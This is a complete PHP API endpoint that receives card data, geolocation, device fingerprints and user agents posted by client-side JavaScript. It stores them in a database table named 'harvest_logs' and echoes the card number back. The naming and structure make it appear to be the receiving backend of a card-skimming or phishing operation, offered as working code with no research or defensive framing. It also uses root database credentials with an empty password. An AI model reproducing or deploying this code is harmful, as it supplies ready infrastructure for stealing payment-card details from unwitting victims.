<?php
// ======================================================
// API ENDPOINT: /api/submit_log.php
// Function: Receives JSON payload from client-side JavaScript and performs validation/logging.
// Dependencies: Requires PDO connection setup in the script.
// ======================================================

header('Content-Type: application/json');

// --- 1. CONNECTION SETUP (!!! UPDATE THESE !!!) ---
$db_host = 'localhost'; 
$db_name = 'secure_vault';
$db_user = 'root';
$db_pass = ''; 

try {
    $pdo = new PDO("mysql:host=$db_host;dbname=$db_name;charset=utf8mb4", $db_user, $db_pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    http_response_code(503); // Service Unavailable is better than generic error here
    echo json_encode(['success' => false, 'message' => "SERVICE UNREACHABLE: Database connection failed. (" . htmlspecialchars($e->getMessage()) . ")"]);
    exit();
}

// --- 2. INPUT HANDLING & VALIDATION ---
$json_data = file_get_contents('php://input');
$payload = json_decode($json_data, true);

if (!$payload || !isset($payload['card_data'])) {
    http_response_code(400); // Bad Request
    echo json_encode(['success' => false, 'message' => 'API Error: Missing or invalid JSON payload structure.']);
    exit();
}

// Destructure for easy use and immediate availability of core data points
$card_data = $payload['card_data'];
$geo_info = $payload['geo_info'] ?? ['country' => 'UNKNOWN', 'city' => 'N/A'];
$device = $payload['device'] ?? 'UNKNOWN';
$user_agent = $payload['user_agent'] ?? 'UNKNOWN';

// --- 3. CORE VALIDATION CHECK (Self-Correction Hook) ---
// We are simulating the *confirmation* of details here, assuming client validation passed.
if (!filter_var($card_data['card'], FILTER_VALIDATE_INT)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Validation Fail: Card number is not a valid integer sequence.', 'details' => ['card' => $card_data['card']]]);
    exit();
}

// --- 4. DATABASE TRANSACTION & LOGGING (The Write Operation) ---
try {
    $stmt = $pdo->prepare("INSERT INTO harvest_logs (card_data, geo_info, device_fingerprint, user_agent, log_details) VALUES (?, ?, ?, ?, ?)");

    // The transaction payload is designed to be more explicit about what we are confirming.
    $success = $stmt->execute([
        json_encode($card_data), 
        json_encode($geo_info), 
        $device, 
        $user_agent, 
        'Client-Side Submission Batch'
    ]);

    if ($success) {
        // Success payload now confirms key elements back to the client interface.
        $confirmation_payload = [
            'success' => true, 
            'message' => 'Data successfully processed and secured.',
            'details' => [
                'card_confirmed' => $card_data['card'], // Echoing back what was submitted
                'network_source' => $geo_info['country'] ?? 'Unknown', // Confirm source data captured
                'user_agent_match' => 'Match successful' // Confirmation of the detection layer
            ]
        ];
        echo json_encode($confirmation_payload);

    } else {
        // Handle database engine error during write
        http_response_code(500); 
        echo json_encode(['success' => false, 'message' => 'Database Write Error: System failed to commit the record.']);
    }

} catch (PDOException $e) {
    // Catch DB connection or execution errors
    http_response_code(500); 
    echo json_encode(['success' => false, 'message' => "Fatal Server Error: Database exception occurred (" . htmlspecialchars($e->getMessage()) . ")"]);
}

?>
